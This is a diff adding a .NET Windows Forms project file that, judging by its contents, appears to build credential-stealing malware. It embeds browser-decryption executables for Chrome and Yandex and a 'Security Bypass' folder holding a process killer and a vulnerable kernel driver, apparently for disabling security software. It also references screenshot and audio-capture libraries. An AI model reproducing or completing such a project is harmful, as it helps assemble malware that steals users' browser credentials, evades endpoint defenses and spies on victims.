@@ -1,0 +1,31 @@
+﻿<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net9.0-windows</TargetFramework>
+    <Nullable>enable</Nullable>
+    <UseWindowsForms>true</UseWindowsForms>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
+
+  <ItemGroup>
+    <None Remove="Browsers\chromelevator_x64.exe" />
+    <None Remove="Browsers\YandexDecryptor.exe" />
+    <None Remove="Security Bypass\Killer.exe" />
+    <None Remove="Security Bypass\vulndriver.sys" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="Browsers\chromelevator_x64.exe" />
+    <EmbeddedResource Include="Browsers\YandexDecryptor.exe" />
+    <EmbeddedResource Include="Security Bypass\Killer.exe" />
+    <EmbeddedResource Include="Security Bypass\vulndriver.sys" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <PackageReference Include="H.Screenshoter" Version="1.0.5" />
+    <PackageReference Include="NAudio" Version="2.2.1" />
+  </ItemGroup>
+
+</Project>
